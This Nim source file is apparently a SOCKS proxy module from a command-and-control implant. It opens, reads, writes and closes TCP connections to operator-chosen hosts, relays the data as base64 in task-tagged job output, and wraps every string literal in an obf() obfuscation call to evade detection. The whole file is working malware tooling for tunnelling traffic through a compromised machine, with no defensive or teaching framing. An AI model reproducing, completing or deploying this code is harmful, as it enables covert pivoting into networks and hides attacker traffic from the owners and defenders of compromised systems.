import std/[json, base64]
import std/tables as tb
import ../utils/global
import ../utils/network/socks/core
import execution/core

proc jsonErr(msg: string): string =
  # Builds a json error response
  $(%*{(obf("ok")): false, (obf("error")): msg})

proc jsonOk(extra: JsonNode = newJObject()): string =
  # Builds a json ok response
  var o = %*{(obf("ok")): true}
  for k, v in extra.pairs:
    o[k] = v
  $o

proc sockKey(host: string, port: int): string =
  # Builds the socket key from the host and port
  host & obf(":") & $port

proc handleConnect(params: JsonNode): string =
  # Opens a socks connection and stores the socket
  let host = params[obf("host")].getStr()
  let port = params[obf("port")].getInt()
  let key = sockKey(host, port)
  if tb.contains(socksFds, key):
    return jsonErr(obf("socket exists for ") & key)
  let fd = sockConnect(host, port)
  if fd == 0:
    return jsonErr(obf("connect failed"))
  socksFds[key] = fd
  jsonOk(%*{(obf("conn_id")): key})

proc handleRead(params: JsonNode): string =
  # Reads data from the socks connection
  let cid = params[obf("conn_id")].getStr()
  if not tb.contains(socksFds, cid):
    return jsonErr(obf("unknown conn"))
  let mx = if params.hasKey(obf("max")): params[obf("max")].getInt() else: 65536
  let data = sockRead(socksFds[cid], mx)
  if data.len == 0:
    jsonOk(%*{(obf("data")): obf("")})
  else:
    jsonOk(%*{(obf("data")): encode(data)})

proc handleWrite(params: JsonNode): string =
  # Writes data to the socks connection
  let cid = params[obf("conn_id")].getStr()
  if not tb.contains(socksFds, cid):
    return jsonErr(obf("unknown conn"))
  sockWrite(socksFds[cid], decode(params[obf("data")].getStr()))
  jsonOk()

proc handleClose(params: JsonNode): string =
  # Closes the socks connection and drops the socket
  let cid = params[obf("conn_id")].getStr()
  if tb.contains(socksFds, cid):
    sockClose(socksFds[cid])
    socksFds.del(cid)
  jsonOk()

proc runPassive(input, params: string): string =
  # Here is where the socks operation is dispatched
  let op = input
  let p = parseJson(params)
  case op
  of obf("connect"): handleConnect(p)
  of obf("read"): handleRead(p)
  of obf("write"): handleWrite(p)
  of obf("close"): handleClose(p)
  else: jsonErr(obf("unknown op ") & op)

proc jobMessage*(host, taskTag, input, params: string): string =
  # Builds the socks job output message
  discard host
  let payload = runPassive(input, params)
  $( %*{
    obf("option"): obf("output"),
    obf("type"): obf("socks"),
    obf("task_tag"): taskTag,
    obf("output"): payload,
  })

proc run*(host, taskTag, input, params: string; buf: var openArray[char]): int =
  # Entrypoint that runs the socks job and writes the output
  writeMsg(jobMessage(host, taskTag, input, params), buf)
